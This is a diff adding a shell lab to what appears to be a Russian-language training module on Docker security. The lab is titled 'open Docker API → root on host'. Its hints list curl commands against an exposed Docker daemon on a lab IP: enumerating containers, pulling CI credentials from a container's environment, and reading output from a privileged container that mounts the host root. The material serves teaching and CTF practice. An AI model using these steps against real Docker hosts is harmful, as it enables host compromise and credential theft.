@@ -13,6 +13,18 @@ useful_for:
   - "CTF и пентест контейнерных сред"
 estimated_minutes: 50
 summary: "Контейнеры — основа облачных ворклоадов. Разбираем открытый Docker-демон (2375/2376), привилегированные контейнеры, монтирование docker.sock, техники escape и утечки через registry."
+lab:
+  kind: shell
+  title: "Практика: открытый Docker API → root на хосте"
+  toolset: [core, curl]
+  workdir: /home/student/docker
+  files: [task.md, notes.md, target.txt]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Проверь демон: `curl -s http://10.0.0.5:2375/version`."
+    - "Перечисли контейнеры: `curl -s http://10.0.0.5:2375/containers/json`."
+    - "Прочитай конфиг CI-агента (env с кредами): `curl -s http://10.0.0.5:2375/containers/a1b2c3d4e5f6/json`."
+    - "Запусти привилегированный контейнер с монтированием корня хоста и прочитай логи: `curl -s 'http://10.0.0.5:2375/containers/pwn/logs?stdout=1'`."
 ---
 
 ## Задача
